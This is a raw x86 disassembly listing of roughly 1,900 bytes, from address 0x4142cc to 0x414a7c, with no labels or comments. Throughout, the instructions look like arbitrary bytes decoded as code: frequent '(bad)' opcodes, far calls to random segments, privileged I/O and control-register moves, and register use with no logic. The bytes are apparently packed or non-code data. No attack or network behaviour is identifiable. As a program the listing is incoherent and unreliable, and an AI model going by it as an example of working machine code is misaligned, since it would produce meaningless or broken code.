  4142cc:	ja     0x41424e
  4142ce:	je     0x41431a
  4142d0:	dec    eax
  4142d1:	jmp    0x414294
  4142d3:	ret    0x56f1
  4142d6:	jl     0x4142a7
  4142d8:	ja     0x414279
  4142da:	jl     0x41429b
  4142dc:	outs   dx,DWORD PTR ds:[esi]
  4142dd:	mov    ds:0xf2194306,eax
  4142e2:	xchg   edx,eax
  4142e3:	jnp    0x414305
  4142e5:	cmp    ebx,0xffffffed
  4142e8:	mov    al,0x15
  4142ea:	adc    ecx,DWORD PTR [edi-0x23]
  4142ed:	xlat   BYTE PTR ds:[ebx]
  4142ee:	pop    ds
  4142ef:	sbb    BYTE PTR [edx-0x30],0xf8
  4142f3:	xchg   esp,eax
  4142f4:	pushf  
  4142f5:	dec    edi
  4142f6:	test   al,0xcc
  4142f8:	pop    ss
  4142f9:	sub    BYTE PTR [ebx],ch
  4142fb:	or     ah,BYTE PTR [eax-0x12]
  4142fe:	or     eax,0xe3be005b
  414303:	rcl    DWORD PTR [ecx*4+0x11ee0e20],0x6c
  41430b:	push   eax
  41430c:	pop    ebx
  41430d:	fdivr  DWORD PTR [eax]
  41430f:	dec    esi
  414310:	and    esi,DWORD PTR [esi+0x5b]
  414313:	addr16 cmp eax,0xada1d516
  414319:	and    eax,0x48f98e65
  41431e:	sahf   
  41431f:	call   0xbc5d:0x775e4fe2
  414326:	das    
  414327:	inc    esi
  414328:	sub    dl,BYTE PTR [edx]
  41432a:	imul   esp,DWORD PTR [ecx],0x68cc4815
  414330:	loope  0x4142da
  414332:	mov    ebp,0x48651269
  414337:	repz or al,0xeb
  41433a:	cmp    DWORD PTR ds:0xf38ba8df,0xffffffbb
  414341:	xor    eax,0x2767ec95
  414346:	pop    edi
  414347:	push   cs
  414348:	aaa    
  414349:	xor    esi,DWORD PTR [ebx+0x7f6d51d1]
  41434f:	mov    edx,?
  414351:	mov    edi,0x8019d897
  414356:	imul   edx,DWORD PTR [edx-0x4f5e60b6],0xd260286f
  414360:	jb     0x414341
  414362:	sub    al,0x3a
  414364:	sub    bl,bh
  414366:	push   eax
  414367:	cmp    eax,0xd513581e
  41436c:	sar    BYTE PTR ds:0xf1c97622,cl
  414372:	scas   al,BYTE PTR es:[edi]
  414373:	push   ecx
  414374:	sbb    bh,BYTE PTR [ebp+0x9]
  414377:	fisubr WORD PTR [ebp-0x1d]
  41437a:	add    DWORD PTR [ebx-0x79],0x79
  41437e:	push   eax
  41437f:	inc    edi
  414380:	jp     0x414338
  414382:	lds    ecx,FWORD PTR [ecx]
  414384:	mov    ch,BYTE PTR [edi+eax*4+0x77]
  414388:	or     cl,BYTE PTR ds:0x1bba34d0
  41438e:	push   esi
  41438f:	(bad)  
  414390:	retf   0x593b
  414393:	pop    edi
  414394:	push   ss
  414395:	fistp  WORD PTR [ebp-0x60afc54e]
  41439b:	cwde   
  41439c:	lock xchg esi,edx
  41439f:	xor    al,0x5b
  4143a1:	xlat   BYTE PTR ds:[ebx]
  4143a2:	aam    0x15
  4143a4:	xchg   esp,eax
  4143a5:	sub    DWORD PTR [ecx],ebx
  4143a7:	ret    
  4143a8:	mov    WORD PTR [ebp-0x6d],fs
  4143ab:	xor    eax,DWORD PTR [ebx]
  4143ad:	out    dx,al
  4143ae:	dec    ebp
  4143af:	daa    
  4143b0:	popa   
  4143b1:	or     dh,ch
  4143b3:	pop    ecx
  4143b4:	xor    bl,BYTE PTR [ebp-0x6430137]
  4143ba:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4143bc:	ss add al,0x28
  4143bf:	mov    WORD PTR [edx],?
  4143c1:	jo     0x414425
  4143c3:	outs   dx,BYTE PTR ds:[esi]
  4143c4:	mov    ah,ch
  4143c6:	sub    BYTE PTR [edi+eax*4-0x40],bh
  4143ca:	rcl    DWORD PTR [ecx-0x6b],cl
  4143cd:	cs push esi
  4143cf:	mov    eax,0x841d2d2d
  4143d4:	dec    edx
  4143d5:	(bad)  
  4143d6:	es push 0x29f9356e
  4143dc:	push   ss
  4143dd:	in     al,0x1f
  4143df:	cmc    
  4143e0:	inc    esp
  4143e1:	pop    es
  4143e2:	mov    ds:0x9638bbaa,al
  4143e7:	leave  
  4143e8:	inc    ecx
  4143e9:	fimul  DWORD PTR [edx-0x7ea4b89a]
  4143ef:	xor    al,0x27
  4143f1:	mov    eax,0x2a1b199f
  4143f6:	mov    ch,0xb0
  4143f8:	jo     0x414402
  4143fa:	adc    ebx,ebx
  4143fc:	push   ss
  4143fd:	outs   dx,DWORD PTR ds:[esi]
  4143fe:	push   ss
  4143ff:	ins    DWORD PTR es:[edi],dx
  414400:	cld    
  414401:	stc    
  414402:	ins    DWORD PTR es:[edi],dx
  414403:	lahf   
  414404:	(bad)  
  414405:	ret    
  414406:	mov    dh,al
  414408:	push   eax
  414409:	adc    esi,DWORD PTR [eax-0x5c047a1f]
  41440f:	out    dx,eax
  414410:	xor    ah,BYTE PTR [ebx]
  414412:	push   esp
  414413:	fistp  QWORD PTR [eax+0x566de28e]
  414419:	adc    ch,ch
  41441b:	adc    al,0xc4
  41441d:	sbb    BYTE PTR [esi-0x63],ah
  414420:	loope  0x414454
  414422:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414423:	ins    BYTE PTR es:[edi],dx
  414424:	cmp    edx,ebp
  414426:	xchg   edx,edi
  414428:	rcl    edx,1
  41442a:	test   ax,0xeee6
  41442e:	xchg   bh,ch
  414430:	xor    DWORD PTR [ecx+0x6c],edx
  414433:	push   0xd56a39fc
  414438:	clc    
  414439:	out    dx,al
  41443a:	mul    BYTE PTR [edx-0xc]
  41443d:	popf   
  41443e:	fmul   QWORD PTR cs:[edx+0x55054987]
  414445:	aaa    
  414446:	pop    edx
  414447:	push   esp
  414448:	sbb    esp,edi
  41444a:	loopne 0x414448
  41444c:	push   ebx
  41444d:	imul   BYTE PTR [ebp+0x22eb4151]
  414453:	(bad)  
  414454:	pop    edi
  414455:	shl    BYTE PTR [edx],0xd
  414458:	popa   
  414459:	pop    edx
  41445a:	mov    edi,0x24ecf37c
  41445f:	adc    al,BYTE PTR [ecx+0x44]
  414462:	jne    0x414489
  414464:	loopne 0x4144c6
  414466:	sbb    bh,BYTE PTR [ebx+0x5dade9b0]
  41446c:	mov    dl,0x13
  41446e:	mov    ah,0x51
  414470:	repnz mov al,ds:0x5c89cccb
  414476:	inc    eax
  414477:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414478:	and    BYTE PTR [eax+0x34b9ba8b],ch
  41447e:	in     eax,dx
  41447f:	mov    al,ds:0xb63584fe
  414484:	mov    edi,0x7cf0476e
  414489:	xor    cl,BYTE PTR ds:0xc6885458
  41448f:	sahf   
  414490:	scas   eax,DWORD PTR es:[edi]
  414491:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414492:	add    eax,0xbafa66
  414497:	lods   al,BYTE PTR ds:[esi]
  414498:	push   edx
  414499:	into   
  41449a:	test   DWORD PTR [eax],ebx
  41449c:	xor    ebp,DWORD PTR [ebx-0x48]
  41449f:	(bad)  
  4144a0:	icebp  
  4144a1:	div    BYTE PTR [edi+0x15442cc3]
  4144a7:	mul    DWORD PTR [ebp+0x2ba26346]
  4144ad:	mov    es,WORD PTR [ecx-0x4d]
  4144b0:	inc    eax
  4144b1:	xlat   BYTE PTR ds:[ebx]
  4144b2:	and    dl,ah
  4144b4:	out    dx,al
  4144b5:	lock retfw 
  4144b8:	or     esp,DWORD PTR [edx]
  4144ba:	or     ebp,0xa6347395
  4144c0:	cli    
  4144c1:	push   ecx
  4144c2:	test   al,0x9d
  4144c4:	in     al,dx
  4144c5:	add    ebp,ebx
  4144c7:	iret   
  4144c8:	daa    
  4144c9:	mov    esp,0x25fa59ff
  4144ce:	adc    eax,0x235cb6e0
  4144d3:	dec    esp
  4144d4:	push   ebp
  4144d5:	cmp    eax,0xb6d46ddf
  4144da:	pusha  
  4144db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144dc:	outs   dx,DWORD PTR ds:[esi]
  4144dd:	xchg   esi,eax
  4144de:	fisubr WORD PTR [ebp+0x8526401]
  4144e4:	mov    cl,0x31
  4144e6:	sub    ch,BYTE PTR [ebx+0x59e082b7]
  4144ec:	pop    esp
  4144ed:	clc    
  4144ee:	and    eax,0x9760109b
  4144f3:	inc    ebx
  4144f4:	in     al,0xef
  4144f6:	or     BYTE PTR [ebx+0x3e093d0c],0x84
  4144fd:	sbb    al,0x90
  4144ff:	call   0x6db0:0x538351f3
  414506:	and    edi,DWORD PTR es:[edx+0x76]
  41450a:	pop    ebx
  41450b:	mov    esp,DWORD PTR [eax]
  41450d:	or     al,al
  41450f:	jno    0x41453c
  414511:	imul   eax,DWORD PTR [edx],0xffffff9d
  414514:	js     0x4144b3
  414516:	jp     0x4144a3
  414518:	and    ah,BYTE PTR [eax-0x1b03b91d]
  41451e:	in     eax,0x2f
  414520:	push   es
  414521:	push   0xffffffb6
  414523:	cwde   
  414524:	arpl   WORD PTR [eax],bx
  414526:	pop    esp
  414527:	mov    ch,0xfd
  414529:	inc    esp
  41452a:	jnp    0x414520
  41452c:	or     eax,ecx
  41452e:	mul    BYTE PTR [eax+0x2799fc16]
  414534:	adc    DWORD PTR [edx+0x453bb9ef],edx
  41453a:	test   al,0x80
  41453c:	mov    esi,0xa8f540c1
  414541:	cmp    al,dl
  414543:	pop    ecx
  414544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414545:	jo     0x4145a8
  414547:	cmp    BYTE PTR [ebp-0x2b],dl
  41454a:	aas    
  41454b:	ret    
  41454c:	inc    esp
  41454d:	dec    edx
  41454e:	mov    esp,0xe3f4845f
  414553:	sub    DWORD PTR [esi+edx*8],ebx
  414556:	enter  0x4561,0x10
  41455a:	lahf   
  41455b:	test   eax,0x3f0be290
  414560:	aaa    
  414561:	shl    DWORD PTR [ecx+0x2d399dc5],cl
  414567:	push   ss
  414568:	jle    0x41453a
  41456a:	add    esi,esi
  41456c:	data16 cmp ax,0x883b
  414571:	je     0x4145be
  414573:	push   edx
  414574:	repz fwait
  414576:	fwait
  414577:	imul   edx,DWORD PTR [eax+0xf],0x21
  41457b:	lods   eax,DWORD PTR ds:[esi]
  41457c:	mov    DWORD PTR [ebx+0x23],eax
  41457f:	adc    al,0x3
  414581:	gs jp  0x414541
  414584:	repz inc esi
  414586:	out    dx,al
  414587:	mov    esp,DWORD PTR ds:0x76817c59
  41458d:	(bad)  
  41458e:	cmp    DWORD PTR [edx-0x63],ebx
  414591:	stos   BYTE PTR es:[edi],al
  414592:	loop   0x4145bc
  414594:	jns    0x4145f2
  414596:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414597:	pop    edx
  414598:	cdq    
  414599:	pop    ebx
  41459a:	mov    esp,ds
  41459c:	mov    WORD PTR [eax-0x14340d2c],ss
  4145a2:	or     eax,0xd830cdc9
  4145a7:	and    DWORD PTR [ecx],ebp
  4145a9:	fdiv   st(4),st
  4145ab:	je     0x41458c
  4145ad:	out    0xe9,al
  4145af:	inc    edi
  4145b0:	inc    esi
  4145b1:	xchg   ecx,eax
  4145b2:	sub    eax,0xd3674536
  4145b7:	adc    eax,0xe63f23d7
  4145bc:	aad    0x15
  4145be:	dec    edx
  4145bf:	or     ah,BYTE PTR [edx]
  4145c1:	mov    edx,0x3eb25091
  4145c6:	cld    
  4145c7:	cmp    BYTE PTR [edx],bl
  4145c9:	jb     0x4145dd
  4145cb:	add    dl,dl
  4145cd:	push   ds
  4145ce:	repnz rcl DWORD PTR [esi-0x51a1d94a],1
  4145d5:	cmp    BYTE PTR [esi+0x60],bh
  4145d8:	dec    esp
  4145d9:	mov    esp,0x15ab9495
  4145de:	in     eax,dx
  4145df:	cmp    BYTE PTR [eax-0x5],ch
  4145e2:	in     al,dx
  4145e3:	mov    bh,0x35
  4145e5:	(bad)  
  4145e7:	(bad)  
  4145e8:	cmp    eax,0x7dfa0d39
  4145ed:	jmp    0x2bb5:0x52d897df
  4145f4:	shr    BYTE PTR [edx],0x9e
  4145f7:	mov    cr6,esp
  4145fa:	push   edi
  4145fb:	lea    eax,[esi+0x46344c9d]
  414601:	(bad)  
  414602:	adc    al,0x76
  414604:	das    
  414605:	cmp    BYTE PTR [ebx],bh
  414607:	jno    0x41465f
  414609:	inc    esp
  41460a:	nop
  41460b:	stos   DWORD PTR es:[edi],eax
  41460c:	sar    DWORD PTR [ebp-0x28],0xe8
  414610:	cld    
  414611:	iret   
  414612:	cld    
  414613:	pusha  
  414614:	and    al,0xc4
  414616:	add    cl,bl
  414618:	stos   DWORD PTR es:[edi],eax
  414619:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41461a:	push   ecx
  41461b:	push   ebp
  41461c:	jnp    0x41462f
  41461e:	adc    al,0xc9
  414620:	je     0x41468a
  414622:	(bad)  
  414624:	pop    ecx
  414625:	test   eax,0x8952888e
  41462a:	icebp  
  41462b:	xchg   edi,eax
  41462c:	repnz test BYTE PTR [ecx+eax*2],0x48
  414631:	(bad)  
  414632:	iret   
  414633:	sbb    eax,0x41bcbf11
  414638:	rcl    DWORD PTR [esi+0x16],0xc
  41463c:	scas   eax,DWORD PTR es:[edi]
  41463d:	sub    edx,ebx
  41463f:	xor    ebx,DWORD PTR ss:[ecx-0x2]
  414643:	and    ah,BYTE PTR ds:0xf234f8c8
  414649:	jo     0x414677
  41464b:	mov    bh,0xd7
  41464d:	pop    esp
  41464e:	inc    BYTE PTR [esi-0x3d]
  414651:	and    bh,BYTE PTR [edx-0x23]
  414654:	sti    
  414655:	call   0x4599:0x2398f597
  41465c:	mov    bh,0xb1
  41465e:	jmp    0x76f9:0xcd23e40
  414665:	inc    edi
  414666:	add    al,0x1c
  414668:	lods   al,BYTE PTR gs:[esi]
  41466a:	push   ebx
  41466b:	mov    ch,0x4
  41466d:	xchg   esp,edi
  41466f:	pop    ebx
  414670:	mov    ebp,0x35218a3e
  414675:	cmp    BYTE PTR [edx],ah
  414677:	fwait
  414678:	cmp    al,0xd1
  41467a:	in     eax,dx
  41467b:	in     al,0x6a
  41467d:	mov    cl,0x2f
  41467f:	mov    bl,0x36
  414681:	xor    BYTE PTR [edi-0x2a],bh
  414684:	sti    
  414685:	loop   0x4146eb
  414687:	rcr    BYTE PTR [ecx+eiz*4+0x52],cl
  41468b:	xor    BYTE PTR [esi],0x90
  41468e:	dec    ebp
  41468f:	pop    eax
  414690:	int3   
  414691:	adc    ebp,DWORD PTR [edi+0xdb05f4c]
  414697:	jb     0x41461f
  414699:	sub    edx,ebp
  41469b:	push   ebp
  41469c:	mov    al,0xc7
  41469e:	jp     0x4146fb
  4146a0:	ins    DWORD PTR es:[edi],dx
  4146a1:	pop    esi
  4146a2:	cwde   
  4146a3:	mov    al,0x37
  4146a5:	rol    BYTE PTR [edx+0x52f8d6f0],1
  4146ab:	sub    DWORD PTR [eax+0x71f0acb7],ebx
  4146b1:	sub    DWORD PTR [edx+0x3f],ebx
  4146b4:	addr16 push ds
  4146b6:	jmp    0xf7b4:0xd74d6aaa
  4146bd:	jecxz  0x4146e1
  4146bf:	rol    BYTE PTR [edx+0x37],1
  4146c2:	fst    DWORD PTR [esi+0x379878c5]
  4146c8:	push   ss
  4146c9:	pavgw  mm1,QWORD PTR [esi+ebx*8+0x5]
  4146ce:	arpl   WORD PTR [eax-0x30],dx
  4146d1:	jnp    0x4146a1
  4146d3:	sub    dh,0xdd
  4146d6:	jbe    0x4146f8
  4146d8:	ins    DWORD PTR es:[edi],dx
  4146d9:	cdq    
  4146da:	jecxz  0x41467e
  4146dc:	ss jg  0x4146b6
  4146df:	jecxz  0x4146e1
  4146e1:	and    al,0x35
  4146e3:	test   al,0x78
  4146e5:	pop    eax
  4146e6:	int3   
  4146e7:	icebp  
  4146e8:	hlt    
  4146e9:	mov    edi,0x10e5940e
  4146ee:	or     eax,0x2e530d02
  4146f3:	xor    BYTE PTR [esi],ah
  4146f5:	add    DWORD PTR [eax+0x17d5a4b],edi
  4146fb:	cmp    eax,0x91708572
  414700:	dec    ebx
  414701:	call   0x6088:0xb39cdeb8
  414708:	and    bl,BYTE PTR [ecx+0x39f81939]
  41470e:	dec    esp
  41470f:	stc    
  414710:	inc    esp
  414711:	in     al,0xe1
  414713:	bound  esp,QWORD PTR [edi-0x1e]
  414716:	bound  esi,QWORD PTR [edi]
  414718:	icebp  
  414719:	in     eax,0xce
  41471b:	(bad)
  414720:	mov    esi,0x20f687a7
  414725:	jmp    0x4146ff
  414727:	mov    ?,WORD PTR [esi+0x5b]
  41472a:	ficomp DWORD PTR [ecx+0x74bc73f0]
  414730:	dec    eax
  414731:	mov    bl,0xef
  414733:	rcl    DWORD PTR [edx],0xad
  414736:	dec    edx
  414737:	bnd call 0xf9aa314
  41473d:	(bad)  
  41473e:	(bad)  
  41473f:	mov    dl,0x36
  414741:	and    ah,ah
  414743:	(bad)  
  414745:	jg     0x414745
  414747:	jmp    0x4147bd
  414749:	inc    ebp
  41474a:	and    DWORD PTR [edi+0x1e533e63],edi
  414750:	and    al,0xc8
  414752:	cwde   
  414753:	cmc    
  414754:	push   esp
  414755:	adc    dh,bh
  414757:	(bad)  
  414758:	dec    ebx
  414759:	sti    
  41475a:	xchg   esi,eax
  41475b:	inc    ebx
  41475c:	sbb    DWORD PTR [esp+esi*2],esi
  41475f:	and    ebp,DWORD PTR [esp+edi*4+0x7c]
  414763:	xor    al,BYTE PTR [eax-0x6c]
  414766:	sub    al,0x67
  414768:	scas   eax,DWORD PTR es:[edi]
  414769:	mov    edi,0x3eed8632
  41476e:	and    al,0x42
  414770:	enter  0x8792,0xca
  414774:	cmp    edx,esi
  414776:	cs ja  0x4147a2
  414779:	jnp    0x414773
  41477b:	pop    esi
  41477c:	sti    
  41477d:	pop    esi
  41477e:	test   al,0x4a
  414780:	xor    eax,0x34bca3e0
  414785:	mov    BYTE PTR [ebx+0x10],dh
  414788:	mov    esp,0xe3674208
  41478d:	cmp    al,dl
  41478f:	jp     0x41471e
  414791:	add    al,0x42
  414793:	mov    eax,ds:0x959289d7
  414798:	adc    esi,DWORD PTR [ebp-0x2d]
  41479b:	push   ecx
  41479c:	or     BYTE PTR ds:0x7fc89480,dh
  4147a2:	pop    edx
  4147a3:	in     al,dx
  4147a4:	daa    
  4147a5:	pop    eax
  4147a6:	int3   
  4147a7:	shl    dh,cl
  4147a9:	mov    al,0x3a
  4147ab:	mov    esp,0xf30f6e5e
  4147b0:	inc    esi
  4147b1:	cmp    BYTE PTR [ebx-0x3c05b5f2],ch
  4147b7:	and    dh,cl
  4147b9:	mov    esp,0x7a2e1d9
  4147be:	int3   
  4147bf:	ins    BYTE PTR es:[edi],dx
  4147c0:	mov    cl,0x45
  4147c2:	pop    ebx
  4147c3:	push   ebx
  4147c4:	je     0x4147c4
  4147c6:	push   edi
  4147c7:	inc    esi
  4147c8:	or     dl,BYTE PTR ds:0x3a660ac8
  4147ce:	in     eax,0x40
  4147d0:	pop    ebx
  4147d1:	aam    0x92
  4147d3:	ret    
  4147d4:	add    BYTE PTR [edi-0x307307ae],bl
  4147da:	jne    0x4147f7
  4147dc:	outs   dx,BYTE PTR ds:[esi]
  4147dd:	push   cs
  4147de:	sub    al,0xec
  4147e0:	lahf   
  4147e1:	xchg   ebp,eax
  4147e2:	scas   al,BYTE PTR es:[edi]
  4147e3:	mov    ch,0x8b
  4147e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147e6:	pop    esi
  4147e7:	jmp    0x4147cc
  4147e9:	rcl    ebp,cl
  4147eb:	shl    dh,1
  4147ed:	add    esi,DWORD PTR [edi+0x7f4e0cf9]
  4147f3:	popf   
  4147f4:	imul   ecx,esp,0xffffffa9
  4147f7:	xchg   edi,eax
  4147f8:	cmp    dl,BYTE PTR [ebx]
  4147fa:	xor    al,0x18
  4147fc:	aam    0xa2
  4147fe:	int3   
  4147ff:	outs   dx,BYTE PTR ds:[esi]
  414800:	shl    DWORD PTR [ebp+0x30],cl
  414803:	jnp    0x414797
  414805:	xchg   esp,eax
  414806:	aas    
  414807:	add    al,0x6
  414809:	jecxz  0x414858
  41480b:	out    0xb5,eax
  41480d:	test   BYTE PTR [edi+ebp*1],al
  414810:	jo     0x414853
  414812:	ss mov ecx,0x5d4a127f
  414818:	push   ss
  414819:	aaa    
  41481a:	ins    BYTE PTR es:[edi],dx
  41481b:	daa    
  41481c:	cwde   
  41481d:	in     al,dx
  41481e:	dec    ebx
  41481f:	popa   
  414820:	inc    ebx
  414821:	frstor [ebx-0x68508b40]
  414827:	push   cs
  414828:	pop    esp
  414829:	daa    
  41482a:	out    0x6a,al
  41482c:	popf   
  41482d:	xor    al,0xa8
  41482f:	ins    DWORD PTR es:[edi],dx
  414830:	std    
  414831:	fs (bad) 
  414834:	ds push 0x714bf3f2
  41483a:	repz mov edx,0xc2c9ea8c
  414840:	push   esi
  414841:	push   ecx
  414842:	ins    DWORD PTR es:[edi],dx
  414843:	pop    eax
  414844:	cmc    
  414845:	jbe    0x41481f
  414847:	out    0x3c,al
  414849:	xlat   BYTE PTR ds:[ebx]
  41484a:	or     dl,BYTE PTR [ebp-0x11845b70]
  414850:	xor    bl,dl
  414852:	pop    eax
  414853:	push   esi
  414854:	shl    ebx,0x1a
  414857:	gs cmp BYTE PTR es:[edx],0x7d
  41485c:	dec    esi
  41485d:	push   0xf
  41485f:	dec    eax
  414860:	jnp    0x414807
  414862:	mov    esi,0xf299f70
  414867:	das    
  414868:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414869:	mov    esp,0xd4d4aad7
  41486e:	mov    es,WORD PTR [eax-0x733c8bd7]
  414874:	xchg   edx,eax
  414875:	xor    al,0x79
  414877:	cli    
  414878:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414879:	mov    ch,0x76
  41487b:	fsub   DWORD PTR [esi+0x7d67dfeb]
  414881:	and    BYTE PTR [ebp+0x35],dh
  414884:	jnp    0x4148c7
  414886:	ret    
  414887:	xchg   esi,edi
  414889:	mov    ch,0xe3
  41488b:	mov    esp,0x31aee992
  414890:	ds retf 
  414892:	sub    ecx,DWORD PTR [ebp-0x53]
  414895:	jge    0x4148db
  414897:	push   esi
  414898:	mov    ?,WORD PTR [esi+0x76]
  41489b:	repz mov ds:0xc172a1da,eax
  4148a1:	inc    ecx
  4148a2:	sbb    ecx,DWORD PTR [ecx+0x69069f33]
  4148a8:	dec    edi
  4148a9:	mov    ds:0x5fa8eb5f,eax
  4148ae:	mov    esp,0x34b48b5a
  4148b3:	icebp  
  4148b4:	outs   dx,DWORD PTR ds:[esi]
  4148b5:	outs   dx,DWORD PTR ds:[esi]
  4148b6:	jnp    0x414876
  4148b8:	iret   
  4148b9:	dec    esp
  4148ba:	scas   al,BYTE PTR es:[edi]
  4148bb:	lea    eax,[ebx]
  4148bd:	mov    ecx,0xe6d90808
  4148c2:	push   0x3b40dadd
  4148c7:	or     BYTE PTR [ecx],ch
  4148c9:	cmp    eax,0x4cba7c95
  4148ce:	or     ebp,ebp
  4148d0:	adc    ecx,eax
  4148d2:	arpl   WORD PTR [ecx+0x7c],dx
  4148d5:	(bad)  
  4148d6:	and    al,0x40
  4148d8:	sahf   
  4148d9:	data16 mov bl,0x76
  4148dc:	dec    esp
  4148dd:	scas   eax,DWORD PTR es:[edi]
  4148de:	mov    al,0xb3
  4148e0:	jl     0x414895
  4148e2:	mov    WORD PTR [esi-0x7bd06ebd],?
  4148e8:	add    BYTE PTR [eax+0x23],0x1
  4148ec:	iret   
  4148ed:	clc    
  4148ee:	call   0x7127:0xe59d1159
  4148f5:	popf   
  4148f6:	jg     0x414917
  4148f8:	xchg   edi,eax
  4148f9:	mov    eax,ds:0xb5d0095f
  4148fe:	push   ds
  4148ff:	xchg   esp,eax
  414900:	lahf   
  414901:	in     al,dx
  414902:	ret    0x94ac
  414905:	repz cs add al,0xe6
  414909:	mov    dl,0xf9
  41490b:	adc    ch,BYTE PTR [edx-0x4d]
  41490e:	inc    ecx
  41490f:	inc    esi
  414910:	add    ebx,DWORD PTR [ebx+0x42]
  414913:	push   eax
  414914:	cmp    ah,al
  414916:	loope  0x4148d5
  414918:	sub    al,0x27
  41491a:	xchg   esp,eax
  41491b:	pop    ss
  41491c:	call   0xc7da:0xcdb28e65
  414923:	ss xchg ebp,eax
  414925:	xchg   BYTE PTR [ecx+0x4a],cl
  414928:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414929:	xchg   edi,eax
  41492a:	sbb    ch,BYTE PTR [esi-0x4c0d1121]
  414930:	jno    0x414973
  414932:	dec    DWORD PTR [esi]
  414934:	repz ror DWORD PTR [esi],cl
  414937:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414938:	popa   
  414939:	and    dl,BYTE PTR [ecx+0x5a29f700]
  41493f:	aaa    
  414940:	push   ss
  414941:	jne    0x414953
  414943:	jne    0x4148dd
  414945:	jge    0x4149a7
  414947:	lahf   
  414948:	push   edx
  414949:	es push edx
  41494b:	jmp    FWORD PTR [ecx+0x10f4885e]
  414951:	jbe    0x414945
  414953:	jo     0x41496f
  414955:	test   DWORD PTR [ebx],esi
  414957:	daa    
  414958:	rol    BYTE PTR [eax+edi*4-0x1d70aa36],0x78
  414960:	popf   
  414961:	push   0x10b871c9
  414966:	mov    BYTE PTR [edi],ah
  414968:	inc    edi
  414969:	sub    al,0xa7
  41496b:	push   ds
  41496c:	or     dh,BYTE PTR [ebx-0x23033f79]
  414972:	inc    ebx
  414973:	sub    al,0x82
  414975:	cmp    ecx,DWORD PTR [edx-0x79]
  414978:	(bad)  
  414979:	sub    dl,BYTE PTR [ebp-0x3f]
  41497c:	adc    DWORD PTR [ebx],edi
  41497e:	sbb    DWORD PTR [edi-0x407c90bb],edx
  414984:	jge    0x41494f
  414986:	ins    BYTE PTR es:[edi],dx
  414987:	inc    esi
  414988:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414989:	scas   eax,DWORD PTR es:[edi]
  41498a:	sub    bh,0xb
  41498d:	pop    ecx
  41498e:	aam    0xab
  414990:	fsubr  QWORD PTR [edx]
  414992:	or     DWORD PTR [esi-0x7c],esp
  414995:	xchg   edi,eax
  414996:	dec    ecx
  414997:	call   0x21f9:0xf593c9b4
  41499e:	lock scas al,BYTE PTR es:[edi]
  4149a0:	mov    ch,0xfa
  4149a2:	mov    dl,0xa2
  4149a4:	idiv   BYTE PTR [esi+0x78]
  4149a7:	xor    bh,ch
  4149a9:	dec    esp
  4149aa:	shl    DWORD PTR [ebp+0x2],1
  4149ad:	add    ebp,DWORD PTR [edx+0x4c85d5cc]
  4149b3:	pop    ebp
  4149b4:	sub    eax,0x16fc6338
  4149b9:	adc    dh,BYTE PTR [edx]
  4149bb:	jns    0x414989
  4149bd:	push   ds
  4149be:	push   ebx
  4149bf:	jo     0x41498a
  4149c1:	push   ds
  4149c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149c3:	or     al,0xd6
  4149c5:	test   al,0xb5
  4149c7:	pop    ds
  4149c8:	xchg   esp,eax
  4149c9:	cmp    eax,0x7bb9b6b3
  4149ce:	cs (bad) 
  4149d0:	test   DWORD PTR [esi-0x1bb634ef],ecx
  4149d6:	into   
  4149d7:	pop    eax
  4149d8:	ficom  DWORD PTR [esi]
  4149da:	mov    dl,0x17
  4149dc:	mov    ds:0x139f76af,eax
  4149e1:	pop    es
  4149e2:	sub    DWORD PTR [ebx+ebx*1],esi
  4149e5:	mov    cl,0x13
  4149e7:	dec    esp
  4149e8:	cs jecxz 0x4149e6
  4149eb:	pop    es
  4149ec:	cs pop edi
  4149ee:	test   esp,edi
  4149f0:	repnz and eax,0xf8a221f3
  4149f6:	shr    BYTE PTR [ecx-0x66],cl
  4149f9:	mov    bh,0x5f
  4149fb:	add    ch,BYTE PTR [ebx-0x7cae7b61]
  414a01:	out    0x32,al
  414a03:	test   BYTE PTR [edi],0xb1
  414a06:	sub    ah,BYTE PTR [edi-0x6264cb9b]
  414a0c:	or     DWORD PTR [eax+0x7a],ebx
  414a0f:	jmp    DWORD PTR [ebx-0x36]
  414a12:	lock adc esi,DWORD PTR [eax-0x2fed1229]
  414a19:	jge    0x414a08
  414a1b:	test   DWORD PTR [eax-0x7c9bf991],esi
  414a21:	(bad)  
  414a22:	lahf   
  414a23:	mov    edx,0x9e839420
  414a28:	xchg   ebp,eax
  414a29:	xor    DWORD PTR [edi+0x65],ebp
  414a2c:	mov    cl,0x9f
  414a2e:	lods   al,BYTE PTR ds:[esi]
  414a2f:	enter  0x28c2,0xa1
  414a33:	lods   eax,DWORD PTR ds:[esi]
  414a34:	rcl    BYTE PTR [edi+0x122e2bfe],1
  414a3a:	jp     0x414a14
  414a3c:	out    dx,al
  414a3d:	xchg   esp,eax
  414a3e:	test   dh,0x57
  414a41:	fs cli 
  414a43:	xor    bh,bl
  414a45:	cli    
  414a46:	mov    ds:0x2e47a957,eax
  414a4b:	int    0x87
  414a4d:	sbb    eax,0x2586a1cd
  414a52:	int3   
  414a53:	test   BYTE PTR [edx],0x3f
  414a56:	inc    ebx
  414a57:	sub    dh,BYTE PTR [edi]
  414a59:	adc    eax,0xf573c403
  414a5e:	icebp  
  414a5f:	mov    esp,edi
  414a61:	data16 lock in al,0x17
  414a65:	stos   DWORD PTR es:[edi],eax
  414a66:	out    dx,eax
  414a67:	push   ebp
  414a68:	add    BYTE PTR [ebp+eax*4-0xc],dl
  414a6c:	cld    
  414a6d:	fwait
  414a6e:	sbb    al,0x26
  414a70:	xor    DWORD PTR [ebx+0x24708b8],edi
  414a76:	(bad)  
  414a77:	mov    ds:0x58b4be34,al
  414a7c:	cli    
